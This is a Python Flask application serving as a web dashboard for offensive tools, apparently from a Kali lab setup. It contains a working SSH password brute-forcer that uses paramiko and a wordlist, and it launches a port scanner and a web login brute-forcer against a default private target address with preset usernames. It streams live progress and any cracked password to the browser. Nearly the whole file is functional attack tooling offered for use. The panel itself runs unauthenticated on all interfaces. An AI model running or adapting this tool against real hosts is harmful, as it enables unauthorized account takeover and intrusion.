import sys
import threading
import datetime
import socket
import queue
import paramiko
from flask import Flask, render_template, request, Response, jsonify
from port_scanner import run_scan, parse_port_range
from web_bruteforce import run_web_attack

sys.path.append('../shared')

app = Flask(__name__)

# Global state
attack_state = {
    "running": False,
    "found": None,
    "log": [],
    "progress": 0,
    "total": 0,
}
log_queue = queue.Queue()
stop_event = threading.Event()


def try_ssh(ip, port, username, password, timeout):
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            hostname=ip,
            port=int(port),
            username=username,
            password=password,
            timeout=timeout,
            banner_timeout=timeout
        )
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return False


def run_attack(ip, port, username, wordlist_path, timeout):
    global attack_state
    stop_event.clear()
    attack_state["running"] = True
    attack_state["found"] = None
    attack_state["log"] = []
    attack_state["progress"] = 0

    try:
        with open(wordlist_path, "r") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        log_queue.put(f"ERROR: Could not load wordlist — {e}")
        attack_state["running"] = False
        return

    attack_state["total"] = len(passwords)
    log_queue.put(f"INFO: Loaded {len(passwords)} passwords")
    log_queue.put(f"INFO: Target {ip}:{port} | User: {username}")
    log_queue.put("INFO: Attack started")

    for i, password in enumerate(passwords, 1):
        if stop_event.is_set():
            log_queue.put("INFO: Attack stopped by user")
            break

        ts = datetime.datetime.now().strftime("%H:%M:%S")
        success = try_ssh(ip, port, username, password, timeout)
        attack_state["progress"] = i

        if success:
            attack_state["found"] = password
            log_queue.put(f"SUCCESS [{i:03d}] {ts} — Password found: {password}")
            break
        else:
            log_queue.put(f"FAILED  [{i:03d}] {ts} — {password}")

    attack_state["running"] = False
    log_queue.put("DONE")


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/start", methods=["POST"])
def start():
    if attack_state["running"]:
        return jsonify({"error": "Attack already running"}), 400

    data = request.form
    ip       = data.get("ip", "172.22.229.213")
    port     = data.get("port", "22")
    username = data.get("username", "yaseen")
    wordlist = data.get("wordlist", "/home/kali/wordlist.txt")
    timeout  = int(data.get("timeout", 5))

    # Check target reachable
    try:
        s = socket.create_connection((ip, int(port)), timeout=3)
        s.close()
    except Exception:
        return jsonify({"error": f"Cannot reach {ip}:{port}"}), 400

    t = threading.Thread(
        target=run_attack,
        args=(ip, port, username, wordlist, timeout),
        daemon=True
    )
    t.start()
    return jsonify({"status": "started"})


@app.route("/stop", methods=["POST"])
def stop():
    stop_event.set()
    return jsonify({"status": "stopping"})


@app.route("/stream")
def stream():
    def event_generator():
        while True:
            try:
                msg = log_queue.get(timeout=30)
                yield f"data: {msg}\n\n"
                if msg == "DONE":
                    break
            except queue.Empty:
                yield "data: PING\n\n"
    return Response(event_generator(), mimetype="text/event-stream")


@app.route("/status")
def status():
    return jsonify({
        "running":  attack_state["running"],
        "found":    attack_state["found"],
        "progress": attack_state["progress"],
        "total":    attack_state["total"],
    })


# ─── Port Scanner State ───────────────────────────────────────
scan_state = {
    "running": False,
    "results": [],
}
scan_queue = queue.Queue()
scan_stop_event = threading.Event()


def run_scan_thread(ip, ports, timeout):
    scan_state["running"] = True
    scan_state["results"] = []
    scan_stop_event.clear()

    results = run_scan(
        ip=ip,
        ports=ports,
        timeout=timeout,
        max_threads=50,
        log_queue=scan_queue,
        stop_event=scan_stop_event,
    )
    scan_state["results"] = results
    scan_state["running"] = False


@app.route("/scan/start", methods=["POST"])
def scan_start():
    if scan_state["running"]:
        return jsonify({"error": "Scan already running"}), 400

    data    = request.form
    ip      = data.get("ip", "172.22.229.213")
    ports   = parse_port_range(data.get("ports", "common"))
    timeout = float(data.get("timeout", 1))

    t = threading.Thread(
        target=run_scan_thread,
        args=(ip, ports, timeout),
        daemon=True
    )
    t.start()
    return jsonify({"status": "started", "total_ports": len(ports)})


@app.route("/scan/stop", methods=["POST"])
def scan_stop():
    scan_stop_event.set()
    return jsonify({"status": "stopping"})


@app.route("/scan/stream")
def scan_stream():
    def event_generator():
        while True:
            try:
                msg = scan_queue.get(timeout=30)
                yield f"data: {msg}\n\n"
                if msg == "DONE":
                    break
            except queue.Empty:
                yield "data: PING\n\n"
    return Response(event_generator(), mimetype="text/event-stream")


@app.route("/scan/results")
def scan_results():
    return jsonify({
        "running": scan_state["running"],
        "results": scan_state["results"],
    })


# ─── Web Brute Force State ────────────────────────────────────
web_state = {
    "running": False,
    "found":   None,
    "progress": 0,
    "total":   0,
}
web_queue     = queue.Queue()
web_stop_event = threading.Event()


def run_web_thread(url, username, wordlist, timeout):
    web_state["running"]  = True
    web_state["found"]    = None
    web_state["progress"] = 0
    web_state["total"]    = 0
    web_stop_event.clear()

    try:
        with open(wordlist, "r") as f:
            passwords = [l.strip() for l in f if l.strip()]
        web_state["total"] = len(passwords)
    except Exception as e:
        web_queue.put(f"ERROR: {e}")
        web_queue.put("DONE")
        web_state["running"] = False
        return

    result = run_web_attack(url, username, wordlist, timeout, web_queue, web_stop_event)
    web_state["found"]   = result.get("found")
    web_state["running"] = False


@app.route("/web/start", methods=["POST"])
def web_start():
    if web_state["running"]:
        return jsonify({"error": "Attack already running"}), 400
    data     = request.form
    url      = data.get("url", "http://172.22.229.213:8888/login.php")
    username = data.get("username", "admin")
    wordlist = data.get("wordlist", "/home/kali/wordlist.txt")
    timeout  = int(data.get("timeout", 5))
    t = threading.Thread(
        target=run_web_thread,
        args=(url, username, wordlist, timeout),
        daemon=True
    )
    t.start()
    return jsonify({"status": "started"})


@app.route("/web/stop", methods=["POST"])
def web_stop():
    web_stop_event.set()
    return jsonify({"status": "stopping"})


@app.route("/web/stream")
def web_stream():
    def event_generator():
        while True:
            try:
                msg = web_queue.get(timeout=30)
                yield f"data: {msg}\n\n"
                if msg == "DONE":
                    break
            except queue.Empty:
                yield "data: PING\n\n"
    return Response(event_generator(), mimetype="text/event-stream")


@app.route("/web/status")
def web_status():
    return jsonify({
        "running":  web_state["running"],
        "found":    web_state["found"],
        "progress": web_state["progress"],
        "total":    web_state["total"],
    })


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000, debug=False)
